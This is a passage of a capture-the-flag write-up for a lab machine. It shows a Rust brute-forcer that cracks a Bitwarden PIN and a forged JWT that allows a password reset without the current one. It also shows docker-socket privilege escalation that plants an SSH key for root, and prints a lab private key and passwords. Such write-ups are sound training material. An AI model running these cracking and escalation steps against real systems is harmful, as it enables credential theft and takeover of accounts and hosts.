00005840: 3668 6a36 3470 3179 5378 4d4f 6230 6775  6hj64p1ySxMOb0gu
00005850: 734e 755f 314e 7536 3550 474e 5459 6532  sNu_1Nu65PGNTYe2
00005860: 4853 3355 5779 6e6b 546e 3273 3567 3d3d  HS3UWynkTn2s5g==
00005870: 0000 0000 1300 ffff 0900 0080 0400 ffff  ................
00005880: 6772 6f75 7069 6e67 7300 0000 0000 0000  groupings.......
00005890: 0000 0000 0800 ffff 1000 0080 0400 ffff  ................
000058a0: 636f 6c6c 6563 7469 6f6e 436f 756e 7473  collectionCounts
000058b0: 0000 0000 0000 ffff 0c00 0080 0400 ffff  ................
000058c0: 666f 6c64 6572 436f 756e 7473 0000 0000  folderCounts....
000058d0: 0000 0000 0000 ffff 0a00 0080 0400 ffff  ................
000058e0: 7479 7065 436f 756e 7473 0000 0000 0000  typeCounts......
000058f0: 0000 0000 0000 ffff 0f00 0080 0400 ffff  ................
00005900: 6661 766f 7269 7465 4369 7068 6572 7300  favoriteCiphers.
00005910: 0000 0000 0100 ffff 0f00 0080 0400 ffff  ................
00005920: 6e6f 466f 6c64 6572 4369 7068 6572 7300  noFolderCiphers.
00005930: 0000 0000 0100 ffff 0700 0080 0400 ffff  ................
00005940: 6369 7068 6572 7300 0000 0000 0100 ffff  ciphers.........
00005950: 0700 0080 0400 ffff 666f 6c64 6572 7300  ........folders.
00005960: 0000 0000 0100 ffff 0000 0000 1300 ffff  ................
00005970: 0400 0080 0400 ffff 7365 6e64 0000 0000  ........send....
00005980: 0000 0000 0800 ffff 0a00 0080 0400 ffff  ................
00005990: 7479 7065 436f 756e 7473 0000 0000 0000  typeCounts......
000059a0: 0000 0000 0000 ffff 0500 0080 0400 ffff  ................
000059b0: 7365 6e64 7300 0000 0000 0000 0100 ffff  sends...........
000059c0: 0000 0000 1300 ffff 0700 0080 0400 ffff  ................
000059d0: 6369 7068 6572 7300 0000 0000 0800 ffff  ciphers.........
000059e0: 0000 0000 1300 ffff 0800 0080 0400 ffff  ................
000059f0: 7365 6e64 5479 7065 0000 0000 0800 ffff  sendType........
00005a00: 0000 0000 1300 ffff 0000 0000 1300 ffff  ................
00005a10: 0300 0000 0000 f1ff 0000 0000 0800 ffff  ................
00005a20: 2400 0080 0400 ffff 3038 6233 3735 3162  $.......08b3751b
00005a30: 2d61 6164 352d 3436 3136 2d62 3166 372d  -aad5-4616-b1f7-
00005a40: 3031 3564 3362 6537 3439 6462 0000 0000  015d3be749db....
00005a50: 0010 0967 b477 7842 0000 0000 1300 ffff  ...g.wxB........
00005a60: 0300 0000 0000 f1ff 2400 0080 0400 ffff  ........$.......
00005a70: 3038 6233 3735 3162 2d61 6164 352d 3436  08b3751b-aad5-46
00005a80: 3136 2d62 3166 372d 3031 3564 3362 6537  16-b1f7-015d3be7
00005a90: 3439 6462 0000 0000 0300 0000 0000 f1ff  49db............
00005aa0: 2400 0080 0400 ffff 6461 6636 6534 3037  $.......daf6e407
00005ab0: 2d34 3335 362d 3463 3264 2d38 3764 362d  -4356-4c2d-87d6-
00005ac0: 3662 3464 6339 3135 3532 3134 0000 0000  6b4dc9155214....
00005ad0: 0300 0000 0000 f1ff 0100 0000 0700 ffff  ................
00005ae0: 0000 0000 0300 ffff 2400 0080 0400 ffff  ........$.......
00005af0: 3038 6233 3735 3162 2d61 6164 352d 3436  08b3751b-aad5-46
00005b00: 3136 2d62 3166 372d 3031 3564 3362 6537  16-b1f7-015d3be7
00005b10: 3439 6462 0000 0000 0000 0000 1300 ffff  49db............
00005b20: 0300 0000 0000 f1ff 0000 0000 0800 ffff  ................
00005b30: 0500 0080 0400 ffff 7468 656d 6500 0000  ........theme...
00005b40: 0600 0080 0400 ffff 7379 7374 656d 0000  ........system..
00005b50: 0600 0080 0400 ffff 7769 6e64 6f77 0000  ........window..
00005b60: 0000 0000 0800 ffff 0000 0000 1300 ffff  ................
00005b70: 0c00 0080 0400 ffff 7374 6174 6556 6572  ........stateVer
00005b80: 7369 6f6e 0000 0000 0600 0000 0300 ffff  sion............
00005b90: 0f00 0080 0400 ffff 656e 7669 726f 6e6d  ........environm
00005ba0: 656e 7455 726c 7300 0000 0000 0800 ffff  entUrls.........
00005bb0: 0400 0080 0400 ffff 6261 7365 0000 0000  ........base....
00005bc0: 3100 0000 0400 ffff 6800 7400 7400 7000  1.......h.t.t.p.
00005bd0: 3a00 2f00 2f00 7000 6100 7300 7300 7700  :././.p.a.s.s.w.
00005be0: 6f00 7200 6400 7400 6500 7300 7400 6900  o.r.d.t.e.s.t.i.
00005bf0: 6e00 6700 7300 6500 7200 7600 6500 7200  n.g.s.e.r.v.e.r.
00005c00: 2d00 6300 6f00 7200 7000 6f00 7200 6100  -.c.o.r.p.o.r.a.
00005c10: 7400 6500 2e00 6c00 6f00 6300 6100 6c00  t.e...l.o.c.a.l.
00005c20: 3a00 3800 3000 3000 3000 0000 0000 0000  :.8.0.0.0.......
00005c30: 0300 0080 0400 ffff 6170 6900 0000 0000  ........api.....
00005c40: 0000 0000 0000 ffff 0800 0080 0400 ffff  ................
00005c50: 6964 656e 7469 7479 0000 0000 0000 ffff  identity........
00005c60: 0800 0080 0400 ffff 7765 6256 6175 6c74  ........webVault
00005c70: 0000 0000 0000 ffff 0500 0080 0400 ffff  ................
00005c80: 6963 6f6e 7300 0000 0000 0000 0000 ffff  icons...........
00005c90: 0d00 0080 0400 ffff 6e6f 7469 6669 6361  ........notifica
00005ca0: 7469 6f6e 7300 0000 0000 0000 0000 ffff  tions...........
00005cb0: 0600 0080 0400 ffff 6576 656e 7473 0000  ........events..
00005cc0: 0000 0000 0000 ffff 0c00 0080 0400 ffff  ................
00005cd0: 6b65 7943 6f6e 6e65 6374 6f72 0000 0000  keyConnector....
00005ce0: 0000 0000 0000 ffff 0000 0000 1300 ffff  ................
00005cf0: 0600 0080 0400 ffff 6c6f 6361 6c65 0000  ........locale..
00005d00: 0000 0000 0100 ffff 1600 0080 0400 ffff  ................
00005d10: 6e6f 4175 746f 5072 6f6d 7074 4269 6f6d  noAutoPromptBiom
00005d20: 6574 7269 6373 0000 0000 0000 0100 ffff  etrics..........
00005d30: 1a00 0080 0400 ffff 6e6f 4175 746f 5072  ........noAutoPr
00005d40: 6f6d 7074 4269 6f6d 6574 7269 6373 5465  omptBiometricsTe
00005d50: 7874 0000 0000 0000 0000 0000 0100 ffff  xt..............
00005d60: 0f00 0080 0400 ffff 7373 6f43 6f64 6556  ........ssoCodeV
00005d70: 6572 6966 6965 7200 0000 0000 0100 ffff  erifier.........
00005d80: 1900 0080 0400 ffff 7373 6f4f 7267 616e  ........ssoOrgan
00005d90: 697a 6174 696f 6e49 6465 6e74 6966 6965  izationIdentifie
00005da0: 7200 0000 0000 0000 0000 0000 0100 ffff  r...............
00005db0: 0800 0080 0400 ffff 7373 6f53 7461 7465  ........ssoState
00005dc0: 0000 0000 0100 ffff 0f00 0080 0400 ffff  ................
00005dd0: 7265 6d65 6d62 6572 6564 456d 6169 6c00  rememberedEmail.
00005de0: 0000 0000 0000 ffff 0c00 0080 0400 ffff  ................
00005df0: 7661 756c 7454 696d 656f 7574 0000 0000  vaultTimeout....
00005e00: 0000 0000 0100 ffff 1200 0080 0400 ffff  ................
00005e10: 7661 756c 7454 696d 656f 7574 4163 7469  vaultTimeoutActi
00005e20: 6f6e 0000 0000 0000 0000 0000 0100 ffff  on..............
00005e30: 0a00 0080 0400 ffff 656e 6162 6c65 5472  ........enableTr
00005e40: 6179 0000 0000 0000 0000 0000 0100 ffff  ay..............
00005e50: 1400 0080 0400 ffff 656e 6162 6c65 4d69  ........enableMi
00005e60: 6e69 6d69 7a65 546f 5472 6179 0000 0000  nimizeToTray....
00005e70: 0000 0000 0100 ffff 1100 0080 0400 ffff  ................
00005e80: 656e 6162 6c65 436c 6f73 6554 6f54 7261  enableCloseToTra
00005e90: 7900 0000 0000 0000 0000 0000 0100 ffff  y...............
00005ea0: 1100 0080 0400 ffff 656e 6162 6c65 5374  ........enableSt
00005eb0: 6172 7454 6f54 7261 7900 0000 0000 0000  artToTray.......
00005ec0: 0000 0000 0100 ffff 0b00 0080 0400 ffff  ................
00005ed0: 6f70 656e 4174 4c6f 6769 6e00 0000 0000  openAtLogin.....
00005ee0: 0000 0000 0100 ffff 0e00 0080 0400 ffff  ................
00005ef0: 616c 7761 7973 5368 6f77 446f 636b 0000  alwaysShowDock..
00005f00: 0000 0000 0100 ffff 1800 0080 0400 ffff  ................
00005f10: 656e 6162 6c65 4272 6f77 7365 7249 6e74  enableBrowserInt
00005f20: 6567 7261 7469 6f6e 0000 0000 0100 ffff  egration........
00005f30: 2300 0080 0400 ffff 656e 6162 6c65 4272  #.......enableBr
00005f40: 6f77 7365 7249 6e74 6567 7261 7469 6f6e  owserIntegration
00005f50: 4669 6e67 6572 7072 696e 7400 0000 0000  Fingerprint.....
00005f60: 0000 0000 0100 ffff 0e00 0080 0400 ffff  ................
00005f70: 6469 7361 626c 6546 6176 6963 6f6e 0000  disableFavicon..
00005f80: 0000 0000 0200 ffff 1d00 0080 0400 ffff  ................
00005f90: 6269 6f6d 6574 7269 6346 696e 6765 7270  biometricFingerp
00005fa0: 7269 6e74 5661 6c69 6461 7465 6400 0000  rintValidated...
00005fb0: 0000 0000 0200 ffff 0000 0000 1300 ffff  ................
```

Now looking at how to brute force the PIN for bitwarden password manager extension, I found [this article](https://ambiso.github.io/bitwarden-pin/) that explain so well how this works and gives us a [poc repository](https://github.com/ambiso/bitwarden-pin) written in rust that I will clone:

```bash
❯ git clone https://github.com/ambiso/bitwarden-pin
Cloning into 'bitwarden-pin'...
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 7 (delta 0), reused 7 (delta 0), pack-reused 0
Receiving objects: 100% (7/7), done.
❯ cd bitwarden-pin/src
```

First, this script takes a json file and extracts the data from it:

```rust
println!("Testing 4 digit pins from 0000 to 9999");
let json: Value = serde_json::from_slice(
    &std::fs::read(format!(
        "{}/Bitwarden/data.json",
        env::var("XDG_CONFIG_HOME").unwrap()
    ))
    .unwrap(),
)
.unwrap();
let email = json[json["activeUserId"].as_str().unwrap()]["profile"]["email"]
    .as_str()
    .unwrap();
let salt = SaltString::b64_encode(email.as_bytes()).unwrap();

let encrypted = json[json["activeUserId"].as_str().unwrap()]["settings"]["pinProtected"]
    ["encrypted"]
    .as_str()
    .unwrap();
let mut split = encrypted.split(".");
```

But I will extract those values from the snappy decompressed data (`xxd snappy.data | less`) and hardcode them into the code:

> Note: To be more fast, in the less prompt I will write `/<field>` to search for the specific key that the script tries to extract

**Email**:
![Email from bitwarden data](/assets/images/Corporate/email-from-bitwarden-data.png)
```rust
let email = "elwin.jones@corporate.htb";
```

**Encrypted data**:
![Encrypted data from bitwarden data](/assets/images/Corporate/encrypted-data-from-bitwarden-data.png)

Now, as this is utf-16, I will take it with strings specifying with `-e l` that is 16-bytes (Utf-16):

```bash
❯ strings -e l ../../data.snappy
2.DXGdSaN8tLq5tSYX1J0ZDg==|4uXLmRNp/dJgE41MYVxq+nvdauinu0YK2eKoMvAEmvJ8AJ9DbexewrghXwlBv9pR|UcBziSYuCiJpp5MORBgHvR2mVgx3ilpQhNtzNJAzf4M=
http://passwordtestingserver-corporate.local:8000
```

```rust
let encrypted = "2.DXGdSaN8tLq5tSYX1J0ZDg==|4uXLmRNp/dJgE41MYVxq+nvdauinu0YK2eKoMvAEmvJ8AJ9DbexewrghXwlBv9pR|UcBziSYuCiJpp5MORBgHvR2mVgx3ilpQhNtzNJAzf4M=";
```

Now if you install cargo, build this rust script and execute it, it doesn't crack successfully:

```bash
❯ sudo apt install cargo -y
❯ cargo run --release
<..SNIP..>
    Finished release [optimized] target(s) in 17.06s
     Running `target/release/bitwarden-pin`
Testing 4 digit pins from 0000 to 9999
Pin not found
```

This is because the kdfIterations for the encryption. The default are 600.000 as seen in [this lines of code](https://github.com/bitwarden/clients/blob/main/libs/common/src/auth/models/domain/kdf-config.ts) in the bitwarden password manager but the script is using 100.000:

```rust
let password_hash = Pbkdf2
                .hash_password_customized(
                    pin.as_bytes(),
                    None,
                    None,
                    Params {
                        rounds: 100000,
                        output_length: 32,
                    },
                    &salt,
                )
                .unwrap();
```
![kdfIterations in bitwarden](/assets/images/Corporate/default-kdfIterations-bitwarden.png)

So I will update it and the remaining rust code is like this:

```rust
use std::env;

use base64::Engine;
use hkdf::Hkdf;
use hmac::{Hmac, Mac};
use pbkdf2::{
    password_hash::{PasswordHasher, SaltString},
    Params, Pbkdf2,
};
use rayon::prelude::*;
use serde_json::Value;
use sha2::Sha256;

fn main() {
    println!("Testing 4 digit pins from 0000 to 9999");
    let email = "elwin.jones@corporate.htb";
    let salt = SaltString::b64_encode(email.as_bytes()).unwrap();

    let encrypted = "2.DXGdSaN8tLq5tSYX1J0ZDg==|4uXLmRNp/dJgE41MYVxq+nvdauinu0YK2eKoMvAEmvJ8AJ9DbexewrghXwlBv9pR|UcBziSYuCiJpp5MORBgHvR2mVgx3ilpQhNtzNJAzf4M=";
    let mut split = encrypted.split(".");
    split.next();
    let encrypted = split.next().unwrap();
    let b64dec = base64::engine::general_purpose::STANDARD;

    let mut split = encrypted.split("|");
    let iv = b64dec.decode(split.next().unwrap()).unwrap();
    let ciphertext = b64dec.decode(split.next().unwrap()).unwrap();
    let mac = b64dec.decode(split.next().unwrap()).unwrap();

    let mut data = Vec::with_capacity(iv.len() + ciphertext.len());
    data.extend(iv);
    data.extend(ciphertext);
    if let Some(pin) = (0..=9999)
        .par_bridge()
        .filter_map(|pin| {
            let pin = format!("{pin:04}");
            let password_hash = Pbkdf2
                .hash_password_customized(
                    pin.as_bytes(),
                    None,
                    None,
                    Params {
                        rounds: 600000,
                        output_length: 32,
                    },
                    &salt,
                )
                .unwrap();

            let hkdf = Hkdf::<Sha256>::from_prk(password_hash.hash.unwrap().as_bytes()).unwrap();
            // let mut enc_key = [0; 32];
            let mut mac_key = [0; 32];
            // hkdf.expand(b"enc", &mut enc_key).unwrap();
            hkdf.expand(b"mac", &mut mac_key).unwrap();

            let mut mac_verify = Hmac::<Sha256>::new_from_slice(&mac_key).unwrap();
            mac_verify.update(&data);

            if mac_verify.verify_slice(&mac).is_ok() {
                Some(pin)
            } else {
                None
            }
        })
        .find_any(|_| true)
    {
        println!("Pin found: {pin}");
    } else {
        println!("Pin not found");
    }
}
```

Now when ran, it successfully finds the pin:

```bash
❯ cargo run --release
<..SNIP..>
    Finished release [optimized] target(s) in 0.98s
     Running `target/release/bitwarden-pin`
Testing 4 digit pins from 0000 to 9999
Pin found: 0239
```

Now, to use it, I will backup my .mozilla directory and copy the .mozilla directory of corporate in my home, execute firefox with --ProfileManager to select the profile:

```bash
❯ mv ~/.mozilla ~/.mozilla.bak
❯ cp -r .mozilla ~/.mozilla
❯ firefox --ProfileManager
```
![Firefox profile selection](/assets/images/Corporate/firefox-profile-selection.png)

And we have the history we saw before:

![History of corporate](/assets/images/Corporate/history-of-corporate.png)

But the extension is not installed, so I will install it going [here](https://addons.mozilla.org/en-GB/firefox/addon/bitwarden-password-manager/). It asks us for the pin:

![bitwarden extension asks for pin](/assets/images/Corporate/bitwarden-extension-installed.png)

When entered and clicking vault, I can see credentials for git.corporate.htb:

![credentials for git.corporate.htb](/assets/images/Corporate/password-for-git.png)

I will update git.corporate.htb in my /etc/hosts to point to 10.9.0.1 because with the IP of the machine (10.10.11.246) I don't have access:

```plaintext
10.9.0.1 git.corporate.htb
```

And sync my time with the one of the machine because the TOTP is generated with time:

```bash
sudo date -s "$(sshpass -p CorporateStarter04041987 ssh elwin.jones@10.9.0.4 "date -d '+2 hours' +'%a %b %d %H:%M:%S %Y'")"
```

> Note: The adjustment of +2 hours is because the difference between the UTC in the machine and CEST in mine. You can view your adjustment according to your hour zone by searching `difference between <your hour zone> and <machine hour zone>`

When logged in git.corporate.htb, I can see the repositories of the code for people.corporate.htb, support.corporate.htb and sso.corporate.htb:

![repositories git](/assets/images/Corporate/repositories-git.png)

Looking at the commits of ourpeople, I saw [this one](http://git.corporate.htb/CorporateIT/ourpeople/commit/e1a0cf34753240d6dda0d42490f2733f260fe90b) that has the jwt secret leaked:

![jwt secret leaked](/assets/images/Corporate/jwt-secret-leaked-commit.png)

So we can forge cookies as any user. Also looking at the reset password functionality, I can see that is using the requireCurrentPassword attribute to know if its needed to enter the current password to change it:

![requires current password validation](/assets/images/Corporate/requires-current-password-validation.png)
![validation in post request in reset](/assets/images/Corporate/validation-in-post-reset-password.png)

So I will forge a cookie in jwt.io that has the requireCurrentPassword to false for example for the user ward.pfannerstill because he belongs to the engineer group and remember that group has access to the docker socket:

```bash
elwin.jones@corporate-workstation-04:~$ for i in $(seq 5000 6000);do id $i 2>/dev/null | grep engineer;done
uid=5001(ward.pfannerstill) gid=5001(ward.pfannerstill) groups=5001(ward.pfannerstill),502(engineer)
uid=5003(kian.rodriguez) gid=5003(kian.rodriguez) groups=5003(kian.rodriguez),502(engineer)
uid=5014(gideon.daugherty) gid=5014(gideon.daugherty) groups=5014(gideon.daugherty),502(engineer)
uid=5025(gayle.graham) gid=5025(gayle.graham) groups=5025(gayle.graham),502(engineer)
uid=5026(dylan.schumm) gid=5026(dylan.schumm) groups=5026(dylan.schumm),502(engineer)
uid=5027(richie.cormier) gid=5027(richie.cormier) groups=5027(richie.cormier),502(engineer)
uid=5028(marge.frami) gid=5028(marge.frami) groups=5028(marge.frami),502(engineer)
uid=5038(abbigail.halvorson) gid=5038(abbigail.halvorson) groups=5038(abbigail.halvorson),502(engineer)
uid=5042(arch.ryan) gid=5042(arch.ryan) groups=5042(arch.ryan),502(engineer)
uid=5050(cathryn.weissnat) gid=5050(cathryn.weissnat) groups=5050(cathryn.weissnat),502(engineer)
```

For this I need to take my current cookie (CorporateSSO) and modify it in jwt.io:

![hermina leuschke jwt in jwt.io](/assets/images/Corporate/hermina-leuschke-jwt-jwt.io.png)
![ward.pfannerstill jwt in jwt.io](/assets/images/Corporate/ward.pfannerstill-jwt-jwt.io.png)

> Note: I've also changed exp because I had a old cookie. For this I will use [this epoch converter](https://www.epochconverter.com/)

Inserting it in the web, we are successfully logged in as ward.pfannerstill:

![logged in as ward.pfannerstill](/assets/images/Corporate/logged-in-as-ward-pfannerstill.png)

We also need to insert it in sso.corporate.htb and we can see it doesn't asks for the current password (also the backend validation is different):

![reset password doesn't ask password](/assets/images/Corporate/reset-password-don't-asks-current-password.png)

I will change it to `password123$!` and we have a successfull message:

![successfull password reset](/assets/images/Corporate/successfull-password-reset.png)

Also, the login in ssh works (as it works with the same backend in this case) and we can execute docker:

```bash
❯ sshpass -p 'password123$!' ssh ward.pfannerstill@10.9.0.4
<..SNIP..>
ward.pfannerstill@corporate-workstation-04:~$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
```

To exploit this, in my machine I will pull an image of ubuntu, save it and transfer it to the victim machine:

```bash
❯ sudo docker pull ubuntu:latest
latest: Pulling from library/ubuntu
9c704ecd0c69: Pull complete 
Digest: sha256:2e863c44b718727c860746568e1d54afd13b2fa71b160f5cd9058fc436217b30
Status: Downloaded newer image for ubuntu:latest
docker.io/library/ubuntu:latest
❯ sudo docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
ubuntu       latest    35a88802559d   5 weeks ago   78.1MB
❯ sudo docker save 35a88802559d -o ubuntu
❯ sudo scp ubuntu ward.pfannerstill@10.9.0.4:/tmp/ubuntu
The authenticity of host '10.9.0.4 (10.9.0.4)' can't be established.
ED25519 key fingerprint is SHA256:t36qncDFBkdTu3EZGXIaT/FUHaekgWkux2jv0vwl/JU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.9.0.4' (ED25519) to the list of known hosts.
ward.pfannerstill@10.9.0.4's password: password123$!
ubuntu                                                 100%   77MB   5.3MB/s   00:14  
```

Now import it in the victim machine, create a container with a mount of / in the /mnt directory, and execute bash on the container to have a shell:

```bash
ward.pfannerstill@corporate-workstation-04:~$ cd /tmp
ward.pfannerstill@corporate-workstation-04:/tmp$ docker load -i ubuntu 
a30a5965a4f7: Loading layer [==================================================>]  80.56MB/80.56MB
Loaded image ID: sha256:35a88802559dd2077e584394471ddaa1a2c5bfd16893b829ea57619301eb3908
ward.pfannerstill@corporate-workstation-04:/tmp$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
<none>       <none>    35a88802559d   5 weeks ago    78.1MB
```

And we have access to the / of this vm in /mnt:

```bash
ward.pfannerstill@corporate-workstation-04:/tmp$ docker run -i -t -v /:/mnt 35a88802559d bash
root@3463649b9b33:/# cd mnt
root@3463649b9b33:/mnt# ls
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
```

I will create in my machine a key pair for ssh and import it in authorized_keys in root/.ssh to access as root to this vm:

```bash
❯ ssh-keygen -f corporate
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in corporate
Your public key has been saved in corporate.pub
The key fingerprint is:
SHA256:v73VHISA0bG/rzyGIRPqJbd+FcIwLNQKrM3FYPEsYfU gabri@kali
The key's randomart image is:
+--[ED25519 256]--+
|    .**oo.+o.    |
|    oo++.* .o .  |
|    +.oooE+. . . |
|   . o.. . o...  |
|        S . .... |
|       o * . ..o.|
|      . + = +.. o|
|       . . =.+.  |
|        ..o ++o. |
+----[SHA256]-----+
❯ cat corporate.pub
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: corporate.pub
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHYyGUFUp5fcLTcFG1tjiHiED0DuKnIt5NWJPIiKjWH3
       │  gabri@kali
───────┴─────────────────────────────────────────────────────────────────────────────────
```

Import it in the machine:

```bash
root@3463649b9b33:/mnt# cd root/
root@3463649b9b33:/mnt/root# cd .ssh/
root@3463649b9b33:/mnt/root/.ssh# echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHYyGUFUp5fcLTcFG1tjiHiED0DuKnIt5NWJPIiKjWH3 gabri@kali' >> authorized_keys
root@3463649b9b33:/mnt/root/.ssh# 
```

And we can access with ssh as root to the vm of the host machine:
```bash
❯ ssh -i corporate root@10.9.0.4
<..SNIP..>
root@corporate-workstation-04:~# 
```

# Access as sysadmin on corporate (host machine)

As we are root, we can login as anyone. The most interesting group is sysadmin because it only has 2 members and it seems like high privilege:

```bash
root@corporate-workstation-04:~# for i in $(seq 5000 6000);do id $i 2>/dev/null | awk '{print $NF}' FS=',';done | sort | uniq -c
      2 500(sysadmin)
     10 501(finance)
     10 502(engineer)
     12 503(it)
     20 504(consultant)
     14 505(hr)
     10 506(sales)
```

That group has 2 users:

```bash
root@corporate-workstation-04:~# for i in $(seq 5000 6000);do id $i 2>/dev/null | grep sysadmin;done
uid=5007(stevie.rosenbaum) gid=5007(stevie.rosenbaum) groups=5007(stevie.rosenbaum),503(it),500(sysadmin)
uid=5015(amie.torphy) gid=5015(amie.torphy) groups=5015(amie.torphy),503(it),500(sysadmin)
```

Migrating to stevie.rosenbaum, we can see a .ssh directory:

```bash
root@corporate-workstation-04:~# su stevie.rosenbaum
stevie.rosenbaum@corporate-workstation-04:/root$ cd
stevie.rosenbaum@corporate-workstation-04:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .local  .profile  .ssh  user.txt
stevie.rosenbaum@corporate-workstation-04:~$ cd .ssh/
stevie.rosenbaum@corporate-workstation-04:~/.ssh$ ls
config  id_rsa  id_rsa.pub  known_hosts  known_hosts.old
```

Which has a config and a id_rsa. In the config file its described with which user and which host we can use this keys:

```bash
stevie.rosenbaum@corporate-workstation-04:~/.ssh$ cat config 
Host mainserver
    HostName corporate.htb
    User sysadmin
```

I will take the id_rsa into my machine and login as sysadmin (as described in the file) in the host machine (finally):

```bash
❯ cat id_rsa-sysadmin-corporate.htb.key
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: id_rsa-sysadmin-corporate.htb.key
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ -----BEGIN OPENSSH PRIVATE KEY-----
   2   │ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
   3   │ NhAAAAAwEAAQAAAYEAvxqRAKHUQYpslhGIn2+urVS4RskAQx+9Zded9ydrLk8MvjXmWD1z
   4   │ FN2z4DOv8v4bMhRdMJPdb446OeJ33bd7AARF7oeExfRzdlu2vY9Meeq/DaN2FfWBFJarBp
   5   │ 9YAIDfvwwvdW+9TUVq9xaPsnN/XjObghfQnNn9R6z+oMuKkGKi/bQ4e9DyuQ63Dj06ELch
   6   │ rKUpk/r1Vjmc8NTj5hWnfV7hNHchdNE9WvwP8KiyHiSQ3CS76JZJKgLhDE6GaywZTczkHo
   7   │ iPAbFOhz7weYly3Zoo15IyzuMH4Dyp9yUmG2OU9Y6mY2JsxMx84z8fpGEP45ZFIXP2caX1
   8   │ N7WtiFYtMIHibIlpVfFRJ4DFSDLpFusu65bG0MddSraBziaWHRnIaeV1RIPsn7PE93pXbJ
   9   │ jesoRxCLEK/dTzxsIRQVjAGM3f8vhB6faPiZpt7q+XPuIjJUOx/+zwDLKszPMstg+cjK6F
  10   │ OirhpiUf/b6fsypoF2VNWPMisd12E1MWwyoNoeNJAAAFoMV9L2HFfS9hAAAAB3NzaC1yc2
  11   │ EAAAGBAL8akQCh1EGKbJYRiJ9vrq1UuEbJAEMfvWXXnfcnay5PDL415lg9cxTds+Azr/L+
  12   │ GzIUXTCT3W+OOjnid923ewAERe6HhMX0c3Zbtr2PTHnqvw2jdhX1gRSWqwafWACA378ML3
  13   │ VvvU1FavcWj7Jzf14zm4IX0JzZ/Ues/qDLipBiov20OHvQ8rkOtw49OhC3IaylKZP69VY5
  14   │ nPDU4+YVp31e4TR3IXTRPVr8D/Cosh4kkNwku+iWSSoC4QxOhmssGU3M5B6IjwGxToc+8H
  15   │ mJct2aKNeSMs7jB+A8qfclJhtjlPWOpmNibMTMfOM/H6RhD+OWRSFz9nGl9Te1rYhWLTCB
  16   │ 4myJaVXxUSeAxUgy6RbrLuuWxtDHXUq2gc4mlh0ZyGnldUSD7J+zxPd6V2yY3rKEcQixCv
  17   │ 3U88bCEUFYwBjN3/L4Qen2j4mabe6vlz7iIyVDsf/s8AyyrMzzLLYPnIyuhToq4aYlH/2+
  18   │ n7MqaBdlTVjzIrHddhNTFsMqDaHjSQAAAAMBAAEAAAF/fhAoVyJpwlJuDxDB72rc77pTVV
  19   │ 6CrcTiS6xQqBl4urOq1E76BHuEzt7xKZTvHHxDtGV6k/D2wgAwqL6cE8ZVfU1UVGVRUMRQ
  20   │ 5mLZyXIeIM6Z+YU7AIFTBSHe8B9tDef1sTF4nR944OBKD3TyleVav+mLS+Yp1051pjKYRb
  21   │ n/Tf/DRVj9abAMbccnOl1pUF19+UV6iAOkk5ytyrClJcJjGnDcXp+3kjf1IW/lk/u0g+3b
  22   │ IV2aF3QMD4qWqmeihFAxvLkTWqJrX71v2j+O9R6f6fjv3oLhhyKXC8ckKCnWbavYPAU258
  23   │ dmtlFTjxUJVl9dzotXx7+ulml71XPd8reLfpw2AV9pD8ueokfA2BcuuEoUa/R4pEu06AUq
  24   │ DJIEhBSBZ/YWV0XM0yf5SxkWXlSb30PMLcXbmmyEQxLq9HHD0wRioNR4wVZ5Aatb1DzGAu
  25   │ n8TXBYd/oaxjwTPmO/HkyKXgZQO0TGCIycE3rOyFx8m9Vacad+CFzpnDxMdSnlgREAAADB
  26   │ AMlsRYHlSr98HvObnDV3VL+mCp6vr5l3aFYIw1p0rjwk+ZONK9/Tx8aAvR6kgK2CSxsabb
  27   │ TZsROhIT23UnKM3I93MUznYOlm8ZhxIAfUDIlpv8d4JzskaZbLqihF32B4Co2vnwk14nYh
  28   │ HloSoWBAY6IBk8/aNI/rva2MlYPEzArM7L7pUodbBUwoyYXVoOVTILZKvO35raiovGmeBX
  29   │ 2FP37RHz9WLwTK0USTLfeQ8fjTznOkTmHIVF2UFUy6EppunAAAAMEA6gIDUB58ja6o8u7w
  30   │ lWxaIm/HzRBRkSHIOdjDo4Sx8Y4f7JT/+EODMps+IaHkRKrHDXJM1VCPNtR5BFHAKvQ8cX
  31   │ LeNI6v5Hk/tZuNWQHb6tmXJ5OZXxJMoou2qA1AkCqGuEudIwGFiS34zHvrMtFNEcWPcDHu
  32   │ xBS84fOzZ26xhjOqT1KQ6KpI+UFv7hsb2Rvu09lKJIpCau0WwSj/+RqhjOe4/Ca2BsaJcS
  33   │ 4EH8DQaTlNHUsmq9j69TAlvt/8+8y5AAAAwQDREFNUoiAVZyxa/tf50xI80YuJiyoioi7j
  34   │ y6U9wKze+NtQDHynY2v0BBaVCIcaHjHTbvhftMx5xpODpAyXbbMH92XR6Eg6ZQilZg19Wx
  35   │ Pm8qF9Fzx05yFnliCA4zqDH1q6Lafr6CJYV30JuXCigItyUp13CiPNsaGsY/rk7JDpuAVJ
  36   │ 4cwpkamGFuAQuvt+gKqcMGMSCbJd/SUkqot4e3duVuosFHVxyBsw5/LpX7WqRpZEXHmPnd
  37   │ xdxRfCNvVMIxEAAAApc3RldmllLnJvc2VuYmF1bUBjb3Jwb3JhdGUtd29ya3N0YXRpb24t
  38   │ MDQBAg==
  39   │ -----END OPENSSH PRIVATE KEY-----
